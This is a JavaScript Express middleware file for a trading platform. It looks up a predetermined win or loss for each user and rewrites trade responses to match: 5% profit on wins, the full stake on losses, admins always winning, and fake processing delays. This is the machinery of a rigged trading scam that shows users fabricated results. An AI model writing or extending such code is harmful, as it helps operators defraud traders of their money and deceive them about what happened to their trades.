/**
 * Trade Outcome Middleware
 * Intercepts trade requests and enforces outcome controls
 */

const TradingControlService = require('../services/tradingControlService');

class TradeOutcomeMiddleware {
  constructor() {
    this.tradingControl = new TradingControlService();
  }

  /**
   * Middleware to check and enforce trade outcomes
   * @param {Object} options - Configuration options
   * @returns {Function} - Express middleware function
   */
  enforceOutcome(options = {}) {
    const {
      tradeType = 'spot',
      bypassAdmin = true,
      logOutcomes = true
    } = options;

    return async (req, res, next) => {
      try {
        // Skip if user is not authenticated
        if (!req.user || !req.user.id) {
          return next();
        }

        // Skip if admin and bypass is enabled
        if (bypassAdmin && req.user.role === 'admin') {
          req.shouldWin = true; // Admins always win by default
          return next();
        }

        // Check trade outcome
        const shouldWin = await this.tradingControl.checkTradeOutcome(
          req.user.id,
          tradeType
        );

        // Store outcome in request for later use
        req.shouldWin = shouldWin;
        req.tradeOutcomeType = tradeType;

        // Log outcome decision
        if (logOutcomes) {
          console.log(`Trade outcome for user ${req.user.id} (${tradeType}): ${shouldWin ? 'WIN' : 'LOSS'}`);
        }

        next();
      } catch (error) {
        console.error('Error in trade outcome middleware:', error);
        // Default to loss on error
        req.shouldWin = false;
        req.tradeOutcomeType = tradeType;
        next();
      }
    };
  }

  /**
   * Middleware to modify trade response based on outcome
   * @param {Object} options - Configuration options
   * @returns {Function} - Express middleware function
   */
  modifyResponse(options = {}) {
    const {
      profitMargin = 0.05, // 5% profit for wins
      lossMargin = 1.0,    // 100% loss for losses
      simulateDelay = true,
      delayRange = [1000, 3000] // 1-3 seconds
    } = options;

    return (req, res, next) => {
      // Store original res.json
      const originalJson = res.json;

      // Override res.json
      res.json = function(data) {
        // Only modify trade responses
        if (req.shouldWin !== undefined && data && (data.success || data.trade)) {
          const modifiedData = { ...data };

          // Modify trade result based on outcome
          if (req.shouldWin) {
            // Winning trade
            modifiedData.outcome = 'win';
            modifiedData.pnl = modifiedData.amount * profitMargin;
            modifiedData.status = 'completed';
            modifiedData.message = 'Trade completed successfully';
          } else {
            // Losing trade
            modifiedData.outcome = 'loss';
            modifiedData.pnl = -modifiedData.amount * lossMargin;
            modifiedData.status = 'failed';
            modifiedData.message = 'Trade resulted in loss';
          }

          // Add outcome metadata
          modifiedData.outcomeMetadata = {
            shouldWin: req.shouldWin,
            tradeType: req.tradeOutcomeType,
            timestamp: new Date().toISOString(),
            enforced: true
          };

          // Simulate processing delay
          if (simulateDelay && !req.skipDelay) {
            const delay = Math.random() * (delayRange[1] - delayRange[0]) + delayRange[0];
            
            setTimeout(() => {
              originalJson.call(this, modifiedData);
            }, delay);
            
            return;
          }

          return originalJson.call(this, modifiedData);
        }

        return originalJson.call(this, data);
      };

      next();
    };
  }

  /**
   * Middleware to add outcome headers
   * @returns {Function} - Express middleware function
   */
  addOutcomeHeaders() {
    return (req, res, next) => {
      // Add outcome information to response headers
      if (req.shouldWin !== undefined) {
        res.set('X-Trade-Outcome', req.shouldWin ? 'win' : 'loss');
        res.set('X-Trade-Type', req.tradeOutcomeType || 'unknown');
        res.set('X-Outcome-Enforced', 'true');
      }

      next();
    };
  }

  /**
   * Middleware to log trade outcomes
   * @returns {Function} - Express middleware function
   */
  logTradeOutcome() {
    return async (req, res, next) => {
      // Store original res.end
      const originalEnd = res.end;

      // Override res.end
      res.end = function(...args) {
        // Log trade outcome if available
        if (req.shouldWin !== undefined && req.user) {
          const logData = {
            userId: req.user.id,
            tradeType: req.tradeOutcomeType,
            shouldWin: req.shouldWin,
            method: req.method,
            url: req.originalUrl,
            timestamp: new Date().toISOString(),
            userAgent: req.get('User-Agent'),
            ipAddress: req.ip
          };

          // Log to console (in production, use proper logging service)
          console.log('Trade Outcome Log:', JSON.stringify(logData));

          // Store in database for audit
          this.tradingControl.logAudit(
            req.user.id,
            'TRADE_OUTCOME_ENFORCED',
            logData
          ).catch(error => {
            console.error('Error logging trade outcome:', error);
          });
        }

        return originalEnd.apply(this, args);
      };

      next();
    };
  }

  /**
   * Combined middleware for complete outcome enforcement
   * @param {Object} options - Configuration options
   * @returns {Array} - Array of middleware functions
   */
  enforceComplete(options = {}) {
    return [
      this.enforceOutcome(options),
      this.modifyResponse(options),
      this.addOutcomeHeaders(),
      this.logTradeOutcome()
    ];
  }
}

module.exports = TradeOutcomeMiddleware;
